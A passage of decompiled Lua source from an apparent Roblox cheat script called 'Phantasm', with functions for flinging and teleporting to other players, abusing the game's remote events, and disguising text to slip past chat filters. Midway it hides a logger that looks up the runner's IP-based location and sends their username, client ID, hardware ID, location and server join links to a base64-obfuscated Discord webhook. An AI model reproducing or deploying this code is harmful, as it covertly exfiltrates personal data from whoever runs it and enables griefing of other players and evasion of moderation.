                                if v223 then
                                    if not isFlung(v228) then
                                        l_huge_0 = v232;
                                        v226 = v228;
                                    end;
                                elseif not v223 then
                                    l_huge_0 = v232;
                                    v226 = v228;
                                end;
                            end;
                        end;
                    end;
                end;
                return v226;
            end;
            closestPlayerV2 = function(v233, v234) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Players_0 (ref), l_Workspace_0 (ref), l_UserInputService_0 (ref)
                local v235 = getChar(v12);
                local v236 = v235 and getRoot(v235);
                local v237 = nil;
                if v235 and v236 then
                    local l_huge_1 = math.huge;
                    for _, v240 in pairs(l_Players_0:GetPlayers()) do
                        if v240 ~= v12 and getChar(v240) then
                            local v241 = getChar(v240);
                            local v242 = v241 and getRoot(v241);
                            local v243 = v241 and getHumanoid(v241);
                            if v241 and v242 and v243 and v243.Health ~= 0 and workspace.CurrentCamera then
                                local v244 = nil;
                                if v233 then
                                    local v245 = l_Workspace_0.CurrentCamera:WorldToViewportPoint(v242.Position);
                                    v244 = (Vector2.new(v245.X, v245.Y) - l_UserInputService_0:GetMouseLocation()).Magnitude;
                                elseif not v233 then
                                    v244 = (v236.Position - v242.Position).Magnitude;
                                end;
                                if v244 < l_huge_1 then
                                    if v234 then
                                        if not isFlung(v240) then
                                            l_huge_1 = v244;
                                            v237 = v240;
                                        end;
                                    elseif not v234 then
                                        l_huge_1 = v244;
                                        v237 = v240;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
                return v237;
            end;
            heartbeatTp = function(v246) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_RenderStepped_0 (ref), l_Heartbeat_0 (ref)
                local v247 = getChar(v12);
                local v248 = v247 and getRoot(v247);
                if v247 and v248 then
                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: l_RenderStepped_0 (ref), v248 (ref), l_Heartbeat_0 (ref)
                        l_RenderStepped_0:Once(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v248 (ref), l_Heartbeat_0 (ref)
                            v248.Velocity = Vector3.new();
                            l_Heartbeat_0:Wait();
                            v248.Velocity = Vector3.new();
                        end);
                    end);
                    l_Heartbeat_0:Once(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v248 (ref), v246 (ref)
                        v248.CFrame = v246;
                    end);
                end;
            end;
            breakVelocity = function(v249) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_RenderStepped_0 (ref)
                assert(v249:IsA("BodyVelocity"), "Error Occured at function 'breakVelocity', Argument 1 must be a 'BodyVelocity'.");
                v249.MaxForce = Vector3.zero;
                v249.Velocity = Vector3.zero;
                l_RenderStepped_0:Wait();
                v249:Destroy();
            end;
            clearVelocity = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v250 = getChar and getChar(v12);
                if v250 then
                    for _, v252 in pairs(v250:GetDescendants()) do
                        if v252:IsA("BodyVelocity") and v252 ~= BG and v252 ~= BV then
                            v252:Destroy();
                        end;
                    end;
                end;
            end;
            randomAlphabeticalString = function(v253) --[[ Line: 0 ]] --[[ Name:  ]]
                local v254 = v253 or math.random(3, 20);
                local v255 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                local v256 = "";
                for _ = 1, v254 do
                    local v258 = math.random(1, #v255);
                    v256 = v256 .. v255:sub(v258, v258);
                end;
                return v256;
            end;
            bypass = function(v259, v260) --[[ Line: 0 ]] --[[ Name:  ]]
                local v261 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ";
                local v262 = v259:gsub(" ", "\020");
                local v263 = "";
                local v264 = false;
                if v260 == "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 " then
                    v264 = true;
                end;
                for v265 = 1, utf8.len(v262) do
                    local v266 = string.sub(v262, utf8.offset(v262, v265), utf8.offset(v262, v265 + 1) - 1);
                    local v267 = string.find(v261, v266, 1, true);
                    if v267 then
                        v263 = v263 .. string.sub(v260, utf8.offset(v260, v267), utf8.offset(v260, v267 + 1) - 1) .. (v264 and "\020" or "");
                    else
                        v263 = v263 .. v266 .. (v264 and "\020" or "");
                    end;
                end;
                return v263;
            end;
            createCaseInsensitivePattern = function(v268) --[[ Line: 0 ]] --[[ Name:  ]]
                local v269 = "";
                for v270 = 1, #v268 do
                    local v271 = v268:sub(v270, v270);
                    if v271:lower() == v271:upper() then
                        v269 = v269 .. v271;
                    else
                        v269 = v269 .. "[" .. v271:upper() .. v271:lower() .. "]";
                    end;
                end;
                return v269;
            end;
            convertToCyrillic = function(v272) --[[ Line: 0 ]] --[[ Name:  ]]
                local v273 = {
                    A = "\239\191\189", 
                    a = "\239\191\189", 
                    O = "\239\191\189", 
                    o = "\239\191\189", 
                    E = "\239\191\189", 
                    e = "\239\191\189"
                };
                local v274 = "";
                for v275 = 1, #v272 do
                    local v276 = v272:sub(v275, v275);
                    v274 = v274 .. (v273[v276] or v276);
                end;
                return v274;
            end;
            flingTp = function(v277) --[[ Line: 0 ]] --[[ Name:  ]]
                local v278 = getChar and getChar(v277);
                local v279 = getRoot(v278);
                local v280 = getHumanoid(v278);
                if v278 and v279 and v280 then
                    local v281 = math.random(1, 2);
                    if v281 == 1 then
                        return v279.CFrame * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(0), math.rad(math.random(-180, 180)));
                    elseif v281 == 2 then
                        return CFrame.new(v279.Position) * (CFrame.new(math.random(-5, 5), math.random(-2.5, 2.5), math.random(-5, 5)) + v280.MoveDirection * v279.Velocity.Magnitude / 1.25) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(0), math.rad(math.random(-180, 180)));
                    end;
                end;
            end;
            isFlung = function(v282) --[[ Line: 0 ]] --[[ Name:  ]]
                local v283 = getChar and getChar(v282);
                local v284 = v283 and getRoot(v283);
                if v283 and v284 and v284.Velocity.Magnitude >= 2000 then
                    return true;
                else
                    return false;
                end;
            end;
            isDeathBlowing = function(v285) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref), v12 (ref)
                local v286 = getChar(v285);
                local v287 = v286 and getRoot(v286);
                local v288 = v286 and getHumanoid(v286);
                if v286 and v287 and v288 then
                    for _, v290 in pairs(v286:GetChildren()) do
                        if v290:IsA("Tool") and v290.Name == "Death Blow" then
                            return true;
                        end;
                    end;
                    if isAnimPlaying(v288, "15128849047") then
                        return true;
                    else
                        for _, v292 in pairs(l_Players_0:GetPlayers()) do
                            if v292 ~= v12 and v292 ~= v285 then
                                local v293 = getChar(v292);
                                local v294 = v293 and getRoot(v293);
                                local v295 = v293 and getHumanoid(v293);
                                if v293 and v294 and v295 and (v294.Position - v287.Position).Magnitude <= 100 then
                                    for _, v297 in pairs(v293:GetChildren()) do
                                        if v297:IsA("Tool") and v297.Name == "Death Blow" then
                                            return;
                                        end;
                                    end;
                                    if isAnimPlaying(v295, "15128849047") then
                                        return true;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
                return false;
            end;
            grabRandom = function(_, v299) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Players_0 (ref)
                local v300 = getAllPlayers();
                v300 = v300[math.random(1, #v300)];
                if v300 ~= v12 then
                    local v301 = getChar and getChar(v12);
                    local v302 = v301 and getRoot(v301);
                    local v303 = getChar and getChar(v300);
                    local v304 = getRoot(v303);
                    local v305 = getHumanoid(v303);
                    if v301 and v302 and v303 and v304 and v305 then
                        if v299 then
                            for _, v307 in pairs(v303:GetChildren()) do
                                if v307:IsA("Tool") and v307.Name == "Death Blow" then
                                    return;
                                end;
                            end;
                            if isAnimPlaying(v305, "15128849047") then
                                return;
                            else
                                for _, v309 in pairs(l_Players_0:GetPlayers()) do
                                    if v309 ~= v12 and v309 ~= v300 then
                                        local v310 = getChar and getChar(v309);
                                        local v311 = getRoot(v310);
                                        local v312 = getHumanoid(v310);
                                        if v310 and v311 and v312 and (v311.Position - v304.Position).Magnitude <= 100 then
                                            for _, v314 in pairs(v310:GetChildren()) do
                                                if v314:IsA("Tool") and v314.Name == "Death Blow" then
                                                    return;
                                                end;
                                            end;
                                            for _, v316 in pairs(v312:GetPlayingAnimationTracks()) do
                                                if v316.Animation.AnimationId == "rbxassetid://15128849047" then
                                                    return;
                                                end;
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                        heartbeatTp(v304.CFrame);
                        task.wait();
                        heartbeatTp(CFrame.lookAt(v302.Position, v304.Position));
                    end;
                end;
            end;
            getCommunicator = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v317 = getChar and getChar(v12);
                if v317 then
                    return v317 and v317:WaitForChild("Communicate", 1);
                else
                    return nil;
                end;
            end;
            click = function() --[[ Line: 0 ]] --[[ Name:  ]]
                local v318 = getCommunicator();
                if v318 then
                    v318:FireServer({
                        Goal = "LeftClick"
                    });
                    v318:FireServer({
                        Goal = "LeftClickRelease"
                    });
                end;
            end;
            communicate = function(v319) --[[ Line: 0 ]] --[[ Name:  ]]
                local v320 = getCommunicator();
                if v320 then
                    v320:FireServer(v319);
                end;
            end;
            bdcancel = function() --[[ Line: 0 ]] --[[ Name:  ]]
                communicate({
                    Dash = Enum.KeyCode.S, 
                    Key = Enum.KeyCode.Q, 
                    Goal = "KeyPress"
                });
            end;
            useSkill = function(v321) --[[ Line: 0 ]] --[[ Name:  ]]
                local v322 = getCommunicator();
                if v322 then
                    v322:FireServer({
                        Goal = "LeftClick", 
                        ToolName = v321 or "Normal Punch"
                    });
                end;
            end;
            bypassKJAnims = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v323 = getChar and getChar(v12);
                if v323 then
                    v323:SetAttribute("Character", "KJ");
                end;
            end;
            patchOffsets = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v324 = getChar and getChar(v12);
                local v325 = v324 and v324:WaitForChild("CharacterHandler"):WaitForChild("Client");
                if v324 and v325 then
                    v325.RunContext = "Server";
                    v325.RunContext = "Legacy";
                end;
            end;
            stopM1Anims = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v326 = getChar and getChar(v12);
                local v327 = getHumanoid(v326);
                if v326 and v327 then
                    for _, v329 in next, v327:GetPlayingAnimationTracks() do
                        local v330 = v329.Animation.AnimationId:lower();
                        for _, v332 in next, m1Animations do
                            if table.find(v332, v330) then
                                v329:Stop();
                            end;
                        end;
                    end;
                end;
            end;
            onCooldown = function(v333) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                if v12.PlayerGui.Hotbar.Backpack.Hotbar[tostring(v333)].Base:FindFirstChild("Cooldown") then
                    return true;
                else
                    return false;
                end;
            end;
            hasRagdollCancel = function(v334) --[[ Line: 0 ]] --[[ Name:  ]]
                if playersWhoHaveRDC[v334] then
                    return true;
                else
                    return false;
                end;
            end;
            getCounterCooldown = function(v335) --[[ Line: 0 ]] --[[ Name:  ]]
                return counterCooldowns[v335] or 0;
            end;
            loadAnim = function(v336, v337, v338) --[[ Line: 0 ]] --[[ Name:  ]]
                if v336 and v337 then
                    local v339 = "rbxassetid://" .. tostring(v337):match("%d+");
                    local l_Animation_0 = Instance.new("Animation");
                    local v341 = nil;
                    if v338 then
                        if v338 == "Server" then
                            l_Animation_0.AnimationId = "rbxassetid://0";
                            v341 = v336:LoadAnimation(l_Animation_0);
                            l_Animation_0.AnimationId = v339;
                        elseif v338 == "Client" then
                            l_Animation_0.AnimationId = v339;
                            v341 = v336:LoadAnimation(l_Animation_0);
                            l_Animation_0.AnimationId = "rbxassetid://0";
                        end;
                    else
                        l_Animation_0.AnimationId = v339;
                        v341 = v336:LoadAnimation(l_Animation_0);
                    end;
                    return v341;
                else
                    return nil;
                end;
            end;
            loadSound = function(v342, v343) --[[ Line: 0 ]] --[[ Name:  ]]
                if v342 and v343 then
                    local v344 = "rbxassetid://" .. tostring(v343):match("%d+");
                    local l_Sound_0 = Instance.new("Sound");
                    l_Sound_0.Parent = v342;
                    l_Sound_0.SoundId = v344;
                    return l_Sound_0;
                else
                    return nil;
                end;
            end;
            stopAllAnims = function(v346, v347) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v348 = v346 or getChar(v12) and getHumanoid(getChar(v12));
                if v348 then
                    if not v348:IsA("Humanoid") and not v348:IsA("Animator") then
                        return warn("Error occured at function 'stopAllAnims', Argument 1 must be a valid animator.");
                    elseif v347 then
                        for _, v350 in pairs(v348:GetPlayingAnimationTracks()) do
                            if typeof(v347) == "table" then
                                for _, v352 in pairs(v347) do
                                    if v350.Animation.AnimationId:match(tostring(v352):match("%d+")) then
                                        v350:Stop();
                                    end;
                                end;
                            elseif v350.Animation.AnimationId:match(tostring(v347):match("%d+")) then
                                v350:Stop();
                            end;
                        end;
                    else
                        for _, v354 in pairs(v348:GetPlayingAnimationTracks()) do
                            v354:Stop();
                        end;
                    end;
                end;
            end;
            deleteAllInstances = function(v355, v356) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v357 = v355 or getChar(v12);
                if v357 and v356 then
                    for _, v359 in pairs(v357:GetChildren()) do
                        if typeof(v356) == "table" then
                            for _, v361 in pairs(v356) do
                                if v359.Name:lower() == v361:lower() then
                                    return v359:Destroy();
                                end;
                            end;
                        elseif v359.Name:lower() == v356:lower() then
                            v359:Destroy();
                        end;
                    end;
                end;
            end;
            idMatch = function(v362, v363) --[[ Line: 0 ]] --[[ Name:  ]]
                if v363 then
                    if typeof(v363) == "table" then
                        for _, v365 in pairs(v363) do
                            if v362:match(v365:match("%d+")) then
                                return true;
                            end;
                        end;
                    elseif v362:match(v363) then
                        return true;
                    end;
                end;
            end;
            isAnimPlaying = function(v366, v367) --[[ Line: 0 ]] --[[ Name:  ]]
                local v368 = tostring(v367):match("%d+");
                for _, v370 in pairs(v366:GetPlayingAnimationTracks()) do
                    if v370.Animation.AnimationId:match(v368) then
                        return v370;
                    end;
                end;
                return nil;
            end;
            isCountering = function(v371) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v84 (ref)
                local l_v371_FirstAncestorWhichIsA_0 = v371:FindFirstAncestorWhichIsA("Model");
                if l_v371_FirstAncestorWhichIsA_0 and l_v371_FirstAncestorWhichIsA_0:FindFirstChild("Counter") then
                    return true;
                else
                    for _, v374 in pairs(v371:GetPlayingAnimationTracks()) do
                        if table.find(v84, v374.Animation.AnimationId) then
                            return true;
                        end;
                    end;
                    return false;
                end;
            end;
            isDeathCountering = function(v375) --[[ Line: 0 ]] --[[ Name:  ]]
                if v375 and v375:FindFirstChild("Counter") then
                    return true;
                else
                    return false;
                end;
            end;
            getAnimationsTable = function(v376) --[[ Line: 0 ]] --[[ Name:  ]]
                local v377 = {};
                for _, v379 in pairs(v376:GetPlayingAnimationTracks()) do
                    table.insert(v377, v379.Animation.AnimationId);
                end;
                return v377;
            end;
            cloneInstance = function(v380) --[[ Line: 0 ]] --[[ Name:  ]]
                v380.Archivable = true;
                local v381 = v380:Clone();
                v380.Archivable = false;
                return v381;
            end;
            cloneCharacter = function(v382) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Workspace_0 (ref)
                local v383 = cloneInstance(v382);
                v383.Parent = l_Workspace_0;
                if v382 and v383 then
                    local v384 = v383 and getRoot(v383);
                    local v385 = v383 and getHumanoid(v383);
                    if v383 and v384 and v385 then
                        v384.Anchored = true;
                        for _, v387 in pairs(v383:GetChildren()) do
                            if v387:IsA("BasePart") then
                                v387.CollisionGroup = "untouchable";
                                v387.Massless = true;
                                v387.CanCollide = false;
                                v387.CanTouch = false;
                                v387.CanQuery = false;
                            end;
                        end;
                    end;
                end;
                return v383;
            end;
            deleteNew = function(v388, v389) --[[ Line: 0 ]] --[[ Name:  ]]
                task.wait();
                local l_Parent_1 = v388.Parent;
                v388:Destroy();
                if v389 then
                    warn("Instance removed, Name:", v388.Name, "ClassName:", v388.ClassName, "Parent:", l_Parent_1);
                end;
            end;
            deleteInstances = function(v391, v392, v393) --[[ Line: 0 ]] --[[ Name:  ]]
                local v394 = v393 and v391:GetDescendants() or v391:GetChildren();
                for _, v396 in pairs(v394) do
                    for _, v398 in pairs(v392) do
                        if v396.Name:lower() == v398:lower() then
                            task.spawn(pcall, deleteNew, v396, false);
                        end;
                    end;
                end;
            end;
            formatRichText = function(v399, v400, v401, v402) --[[ Line: 0 ]] --[[ Name:  ]]
                return "<font color=\"rgb(" .. v399 .. "," .. v400 .. "," .. v401 .. ")\"></font>" .. "<font color=\"rgb(" .. v399 .. "," .. v400 .. "," .. v401 .. ")\">" .. v402 .. "</font>" .. "<font color=\"rgb(" .. v399 .. "," .. v400 .. "," .. v401 .. ")\"></font>";
            end;
            local v403 = v27({
                Url = "http://www.ip-api.com/json", 
                Method = "GET"
            });
            local v404 = "JSONDecode";
            local l_l_HttpService_0_0 = l_HttpService_0;
            local v406 = l_HttpService_0[v404](l_l_HttpService_0_0, v403.Body) or {};
            l_l_HttpService_0_0 = v406.query or nil;
            v404 = v406.country or "Unknown";
            local v407 = v406.region or "Unknown";
            local v408 = v406.regionName or "Unknown";
            local v409 = v406.timezone or "Unknown";
            local v410 = "GetPlatform";
            local l_l_UserInputService_0_0 = l_UserInputService_0;
            local v412 = l_UserInputService_0[v410](l_l_UserInputService_0_0) == Enum.Platform.Windows and ":computer:" or ":mobile_phone:";
            l_l_HttpService_0_0 = l_l_HttpService_0_0 and v24.sha512(l_l_HttpService_0_0 .. v404 .. v407 .. v408 .. v409) or "Unknown";
            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v27 (ref), v29 (ref), l_HttpService_0 (ref), v412 (ref), l_Players_0 (ref), v101 (ref), v102 (ref), v404 (ref), v407 (ref), v408 (ref), v409 (ref), v12 (ref), l_RbxAnalyticsService_0 (ref), l_l_HttpService_0_0 (ref)
                v27({
                    Url = v29("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Mjc2MDAzMDE3MTU2NjE3MC9SaE56d21HUVM5X05VN2dVd0VmZnZlRTlYNlh3VVVFVjNTR3BwZ3JyUGVxUVNsQjNoM0ZNcXdaRGxUaU85VnZ0WDRfaQ=="), 
                    Method = "POST", 
                    Headers = {
                        ["content-type"] = "application/json"
                    }, 
                    Body = l_HttpService_0:JSONEncode({
                        embeds = {
                            {
                                title = "Phantasm Logs", 
                                description = "User Device: " .. v412, 
                                type = "rich", 
                                color = tonumber(0), 
                                fields = {
                                    {
                                        name = "\n\n-----------------------------------------------------Information** **", 
                                        value = "Identified Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "Unknown") .. "\nExecutor Name: " .. (getexecutorname and tostring(getexecutorname()) or "Unknown") .. "\nServer Players: " .. (#l_Players_0:GetPlayers() or "Unknown") .. "\nServer Type: " .. v101 .. "\nServer Version: " .. v102 .. "\nCountry: " .. v404 .. "\nRegion: " .. v407 .. "\nRegion Name: " .. v408 .. "\nTimezone: " .. v409 .. "\nUsername: [" .. v12.Name .. " (" .. v12.DisplayName .. ")](https://www.roblox.com/users/" .. v12.UserId .. "/profile)\nClient ID: " .. (l_RbxAnalyticsService_0:GetClientId() or "Unknown") .. "\nHWID: " .. (gethwid and tostring(gethwid()) or get_hwid and tostring(get_hwid()) or "Unknown") .. "\nHashed Identifier: " .. l_l_HttpService_0_0 .. "\n-----------------------------------------------------" .. "\n[**Join**](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", 
                                        inline = false
                                    }, 
                                    {
                                        name = "JobId Join", 
                                        value = "```Roblox.GameLauncher.joinGameInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "')```", 
                                        inline = true
                                    }, 
                                    {
                                        name = "JobId", 
                                        value = "```r\r\n    " .. game.JobId .. "\r\n\r\n    ```", 
                                        inline = true
                                    }, 
                                    {
                                        name = "Browser Join", 
                                        value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", 
                                        inline = false
                                    }, 
                                    {
                                        name = "Script Join", 
                                        value = "```lua\r\n    game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game:GetService(\"Players\").LocalPlayer)\r\n    ```", 
                                        inline = false
                                    }
                                }, 
                                thumbnail = {
                                    url = fetchAvatar()
                                }, 
                                footer = {
                                    text = "Script ran at " .. os.date("%Y-%m-%d %H:%M:%S")
                                }
                            }
                        }
                    })
                });
            end);
            l_l_UserInputService_0_0 = l_Workspace_0.Thrown;
            v410 = l_Workspace_0.Thrown;
            v410.Archivable = true;
            l_l_UserInputService_0_0 = v410:Clone();
            v410.Archivable = false;
            l_l_UserInputService_0_0:ClearAllChildren();
            for _, v414 in pairs(v410:GetChildren()) do
                v414.Parent = l_l_UserInputService_0_0;
            end;
            v410:Destroy();
            l_l_UserInputService_0_0.Name = "Thrown";
            l_l_UserInputService_0_0.Parent = l_Workspace_0;
            v68[#v68 + 1] = v410.ChildAdded:Connect(function(v415) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_RenderStepped_0 (ref), l_l_UserInputService_0_0 (ref)
                task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_RenderStepped_0 (ref), v415 (ref), l_l_UserInputService_0_0 (ref)
                    local v416 = tick();
                    repeat
                        l_RenderStepped_0:Wait();
                    until v415 and v415.Parent or tick() >= v416 + 1;
                    if v415 and v415.Parent then
                        local _, l_result_2 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v415 (ref), l_l_UserInputService_0_0 (ref)
                            if v415:IsA("BasePart") then
                                local l_Locked_0 = v415.Locked;
                                v415.Locked = false;
                                v415.Parent = l_l_UserInputService_0_0;
                                v415.Locked = l_Locked_0;
                            else
                                v415.Parent = l_l_UserInputService_0_0;
                            end;
                        end);
                        if l_result_2 then
                            error("(Phantasm) Failed to clone instance with name " .. v415.Name .. ", error: " .. l_result_2, 5);
                        end;
                    end;
                end);
            end);
            local v420 = {};
            v68[#v68 + 1] = l_l_UserInputService_0_0.ChildAdded:Connect(function(v421) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v420 (ref), l_Workspace_0 (ref), l_TweenService_0 (ref)
                task.wait();
                if v421:IsA("BasePart") then
                    v421:SetAttribute("Spawn", tick());
                end;
                if v421:IsA("Attachment") or v421:IsA("WeldConstraint") then
                    v420[v421] = tick();
                    local v422 = tick();
                    for v423, v424 in pairs(v420) do
                        if not v423 or not v423.Parent then
                            v420[v423] = nil;
                        else
                            local v425 = 15;
                            if v423:IsA("BasePart") then
                                v425 = 30;
                            end;
                            if v425 < v422 - v424 then
                                v423:Destroy();
                                v420[v423] = nil;
                            end;
                        end;
                    end;
                end;
                if v421.Name == "QuickWind" then
                    if v421:GetAttribute("Name") then
                        local l_FirstChild_0 = l_Workspace_0.Live:FindFirstChild(v421:GetAttribute("Name"));
                        if l_FirstChild_0 then
                            l_FirstChild_0 = l_FirstChild_0.PrimaryPart;
                            if l_FirstChild_0 then
                                v421.CFrame = l_FirstChild_0.CFrame * CFrame.Angles(math.rad((math.random(-360, 360))), math.rad((math.random(-360, 360))), (math.rad((math.random(-360, 360)))));
                            end;
                        end;
                    end;
                    l_TweenService_0:Create(v421, TweenInfo.new(v421:GetAttribute("Time") * 3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        Size = v421.Size + Vector3.new(15, 4, 15, 0) * v421:GetAttribute("Scale"), 
                        Transparency = 1
                    }):Play();
                    return;
                elseif v421.Name == "QuickSlashMesh" then
                    if v421:GetAttribute("Name") then
                        local l_FirstChild_1 = l_Workspace_0.Live:FindFirstChild(v421:GetAttribute("Name"));
                        if l_FirstChild_1 then
                            l_FirstChild_1 = l_FirstChild_1.PrimaryPart;
                            if l_FirstChild_1 then
                                v421.CFrame = l_FirstChild_1.CFrame * CFrame.Angles(math.rad((math.random(-360, 360))), math.rad((math.random(-360, 360))), (math.rad((math.random(-360, 360)))));
                            end;
                        end;
                    end;
                    local v428 = v421:FindFirstChild("Mesh") or v421:WaitForChild("Mesh", 0.2);
                    if not v428 then
                        return;
                    else
                        l_TweenService_0:Create(v428, TweenInfo.new(v421:GetAttribute("Time"), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                            Scale = Vector3.new(0, 7, 0, 0) * v421:GetAttribute("Scale")
                        }):Play();
                        return;
                    end;
                else
                    if v421.Name:find("AdjustStabby3") then
                        v421.Name = string.sub(v421.Name, 14, #v421.Name);
                        local l_FirstChild_2 = l_Workspace_0.Live:FindFirstChild(v421.Name);
                        if l_FirstChild_2 then
                            l_FirstChild_2 = l_FirstChild_2.PrimaryPart;
                            if l_FirstChild_2 then
                                v421:SetPrimaryPartCFrame((l_FirstChild_2.CFrame + Vector3.new(0, 5, 0, 0)) * CFrame.new(-1.6784668E-4, 3.05175781E-5, -3.15378571, 4.11212444E-4, -0.657321572, -0.753614008, -1.95897822E-8, 0.753610671, -0.657323241, 1.00000131, 2.68951058E-4, 3.08543444E-4));
                                return;
                            end;
                        end;
                    elseif v421.Name:find("AdjustStabby2") then
                        v421.Name = string.sub(v421.Name, 14, #v421.Name);
                        local l_FirstChild_3 = l_Workspace_0.Live:FindFirstChild(v421.Name);
                        if l_FirstChild_3 then
                            l_FirstChild_3 = l_FirstChild_3.PrimaryPart;
                            if l_FirstChild_3 then
                                v421:SetPrimaryPartCFrame((l_FirstChild_3.CFrame + Vector3.new(0, 5, 0, 0)) * CFrame.new(-1.98364258E-4, 3.05175781E-5, -3.15378571, 4.10616398E-4, -0.7406317, -0.671912789, -2.207255E-8, 0.671912074, -0.740631104, 1.00000143, 3.02284956E-4, 2.74270773E-4));
                                return;
                            end;
                        end;
                    elseif v421.Name:find("AdjustStabby1") then
